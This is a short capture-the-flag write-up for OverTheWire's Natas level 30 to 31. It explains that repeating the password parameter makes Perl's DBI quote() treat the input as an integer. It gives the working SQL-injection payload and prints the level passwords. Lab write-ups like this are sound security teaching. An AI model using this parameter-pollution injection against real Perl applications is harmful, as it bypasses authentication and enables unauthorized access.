# Natas Level 30 to 31

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 30 -> 31 |
| Status | Complete |

## Objective

Bypass a Perl DBI login query.

## Given Access

User: `natas30`

Password:

```text
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```

## Method

The source calls `$dbh->quote(param('password'))`. Supplying two `password` parameters makes Perl pass extra arguments into `quote`; using SQL type `4` causes the first value to be treated as an integer expression.

Payload:

```text
username=natas31&password=1 or 1=1&password=4
```

## Result

Password for `natas31`:

```text
m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
```

## Lesson

List context and repeated parameters can change function arguments in Perl CGI applications.

## References

- https://overthewire.org/wargames/natas/
